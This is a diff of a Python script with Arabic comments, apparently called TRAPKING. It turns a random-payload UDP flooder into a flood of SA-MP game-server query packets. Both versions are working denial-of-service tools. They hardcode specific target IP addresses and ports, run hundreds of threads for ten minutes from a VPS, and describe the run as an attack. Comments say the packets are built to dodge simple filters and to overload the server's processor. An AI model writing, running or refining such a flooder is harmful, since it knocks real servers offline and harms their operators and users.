@@ -1,54 +1,60 @@
 import socket
-import random
-import threading
 import time
+import threading
+import random
 
 # =====================================================================
-# === TRAPKING ADVANCED SMART UDP FLOODER (Cloud Edition) ===
+# === TRAPKING SAMP SMART QUERY STRESSOR (Advanced Edition) ===
 # =====================================================================
 
-TARGET_IP = "89.46.1.130" 
-BASE_PORT = 7008            # البورت الأساسي
-PORT_RANGE = 5              # استهداف البورت الأساسي مع بورتات قريبة لإرباك الهدف
-DURATION = 600               # مدة الهجوم بالثواني
-THREADS_COUNT = 300         # رفع عدد الخيوط لاستغلال Ryzen 9 بأقصى طاقة
+TARGET_IP = "94.23.168.153"  # الـ IP المستهدف (أو 89.46.1.130)
+TARGET_PORT = 2343            # البورت المستهدف (مثلاً 7777 أو 7008)
+DURATION = 600                 # مدة الاختبار بالثواني
+THREADS_COUNT = 250           # عدد الخيوط لاستغلال Ryzen 9
 
-def smart_stress():
+# أنواع طلبات الاستعلام الحقيقية الخاصة ببروتوكول SA-MP لإرباك معالج السيرفر
+# 'i' = Info, 'c' = Clients, 'r' = Rules, 'd' = Details
+QUERY_TYPES = [b'i', b'c', b'r', b'd']
+
+def generate_samp_payload(ip_str, port_int):
+    try:
+        # بناء ترويسة استعلام SA-MP أصلية وصحيحة تقنياً
+        ip_bytes = socket.inet_aton(ip_str)
+        port_bytes = int(port_int).to_bytes(2, 'little')
+        q_type = random.choice(QUERY_TYPES)
+        # هيكل حزمة الاستعلام: 'S' 'A' 'M' 'P' + IP + Port + Query Type
+        return b'SAMP' + ip_bytes + port_bytes + q_type
+    except:
+        return b'SAMP'
+
+def attack_worker():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
     end_time = time.time() + DURATION
+    
+    payload = generate_samp_payload(TARGET_IP, TARGET_PORT)
     
     while time.time() < end_time:
         try:
-            # توليد حجم وبصمة عشوائية للحزمة في كل مرة لتفادي الفلاتر البسيطة
-            packet_size = random.randint(512, 1400)
-            packet_data = random._urandom(packet_size)
-            
-            # اختيار بورت عشوائي ضمن النطاق المستهدف
-            target_port = BASE_PORT + random.randint(0, PORT_RANGE)
-            
-            client.sendto(packet_data, (TARGET_IP, target_port))
+            client.sendto(payload, (TARGET_IP, TARGET_PORT))
         except:
             pass
             
     client.close()
 
 def main():
-    print(f"[*] بدء الهجوم الذكي والموزع على الهدف: {TARGET_IP}")
-    print(f"[*] النطاق المستهدف للبورتات: من {BASE_PORT} إلى {BASE_PORT + PORT_RANGE}")
-    print(f"[*] تشغيل {THREADS_COUNT} خيط ذكي عبر الـ VPS...")
+    print(f"[*] بدء الهجوم الذكي والمطور على سيرفر SA-MP: {TARGET_IP}:{TARGET_PORT}")
+    print(f"[*] استخدام {THREADS_COUNT} خيط عبر الـ VPS وبث طلبات استعلام حقيقية...")
     
     threads = []
     for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=smart_stress)
+        t = threading.Thread(target=attack_worker)
         threads.append(t)
         t.start()
         
     for t in threads:
         t.join()
         
-    print("\n[+] انتهت الجلسة الذكية.")
+    print("\n[+] انتهت عملية الاختبار بنجاح.")
 
 if __name__ == "__main__":
     main()
